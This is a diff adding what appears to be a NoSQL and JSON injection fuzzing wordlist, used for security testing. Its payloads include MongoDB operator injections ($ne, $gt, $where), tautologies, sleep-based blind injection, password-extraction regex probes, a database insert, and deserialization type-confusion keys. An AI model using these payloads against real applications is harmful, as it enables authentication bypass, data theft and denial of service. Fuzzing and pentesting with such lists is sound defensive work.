@@ -1,0 +1,99 @@
+{}
+[]
+"1"
+"0e2"
+[1,2]
+"1e0"
+"1e2"
+"0e0"
+"\x00"
+[,,,,]
+|| 1==1
+["1",2]
+":test"
+[$ne]=1
+{"1":0}
+{"id":1}
+{"0":[]}
+["\x00"]
+{"_id":1}
+["1","2"]
+{"0":[1]}
+{"uid":1}
+{"1":"0"}
+{$gt: ''}
+{"_uid":1}
+{ $ne: 1 }
+{"\x00":0}
+{"id":"1"}
+{"$or":"1"}
+{"\x00":[]}
+{"uid":"1"}
+{"\x00":""}
+{"_id":"1"}
+{"$gt": ""}
+[{"1":"0"}]
+{"0":[1,2]}
+{"\x00":[1]}
+{"0":"\x00"}
+{"_uid":"1"}
+{"\x00":"0"}
+[{"1":"0"},1]
+[1,{"1":"0"}]
+{":test":"1"}
+{"$where":"1"}
+{"$or":"1==1"}
+{"\x00":[1,2]}
+[":\x00", "1"]
+';sleep(5000);
+[":test", "1"]
+';sleep(5000);'
+{"0":["1","2"]}
+["1",{"1":"0"}]
+["\x00", "\x00"]
+';sleep(5000);+'
+$where: '1 == 1'
+eval("while(1);")
+{"$where":"1==1"}
+{"&exists":false}
+, $where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+"\"\\/Date(-1)\\/\""
+', $or: [ {}, { 'a':'a
+{"constructor":"null"}
+{"toJSON":"while(1);"}
+true, $where: '1 == 1'
+{"Cls":"null","A":"B"}
+{"cls":"null","A":"B"}
+{"valueOf":"while(1);"}
+{"kind":"null","A":"B"}
+{"Kind":"null","A":"B"}
+{"_constructor":"null"}
+{"Klass":"null","A":"B"}
+{"class":"null","A":"B"}
+{"_kind":"null","A":"B"}
+{"__constructor":"null"}
+{"Class":"null","A":"B"}
+{"klass":"null","A":"B"}
+{"toString":"while(1);"}
+{"_class":"null","A":"B"}
+";return(true);var xyz='a
+{"__kind":"null","A":"B"}
+';return 'a'=='a' && ''=='
+{"__class":"null","A":"B"}
+"2012-04-23T18:25:43.511Z"
+"2012-04-21T18:25:43-05:00"
+{"_className":"null","A":"B"}
+{"__className":"null","A":"B"}
+"\"\\/Date(1335205592410)\\/\""
+db.injection.insert({success:1});
+' && this.password.match(/.*/)//+%00
+"\"\\/Date(1335205592410-0500)\\/\""
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"
+"\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\b\t\n\u000b\f\r\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c\u001d\u001e\u001f !\"#$%&'()*,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}
